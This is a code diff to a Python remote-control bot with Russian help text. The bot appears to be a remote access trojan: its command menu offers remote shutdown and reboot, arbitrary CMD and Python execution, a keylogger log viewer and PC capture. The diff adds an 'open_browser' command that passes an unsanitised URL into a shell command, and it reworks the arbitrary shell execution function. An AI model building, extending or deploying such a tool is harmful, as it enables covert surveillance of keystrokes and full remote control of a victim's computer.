@@ -86,6 +86,7 @@ def get_start_message():
         "/shutdown — Выключить компьютер\n"
         "/reboot — Перезагрузить компьютер\n"
         "/cmd_exec <команда> — Выполнить команду через CMD\n"
+        "/open_browser <ссылка на сайт(можно оставить пустым)> — Открыть браузер/ссылку \n"
         "/python_exec <выражение> — Выполнить Python-выражение\n\n"
         "🔐 Логи и данные\n"
         "/keylogs — Показать логи клавиш\n"
@@ -111,6 +112,8 @@ def get_start_message():
 def execute_cmd(command_text):
     global current_working_directory
     cmd = command_text.strip()
+
+    # Обработка команды cd
     if cmd.lower().startswith('cd'):
         parts = cmd.split(maxsplit=1)
         if len(parts) == 2:
@@ -123,10 +126,30 @@ def execute_cmd(command_text):
                 return f'Папка не найдена: {resolved_path}'
         else:
             return current_working_directory
+
+    # Выполнение других команд
+    process = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE, cwd=current_working_directory)
+    out, err = process.communicate()
+
+    if sys.platform.startswith('win'):
+        encoding = 'cp866'
     else:
-        process = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE, cwd=current_working_directory)
-        out, err = process.communicate()
-        return (out + err).decode(errors='ignore') or '[пустой вывод]'
+        encoding = 'utf-8'
+
+    return (out + err).decode(encoding, errors='replace') or '[пустой вывод]'
+
+
+def open_browser(url="https://www.google.com/"):
+    """Открывает браузер по умолчанию"""
+    if not url:
+        return "Ошибка: URL не указан"
+
+    if sys.platform.startswith('win'):
+        cmd = f'start "" "{url}"'
+    else:
+        return f"Ошибка"
+
+    return execute_cmd(cmd)
 
 
 def capture_pc():
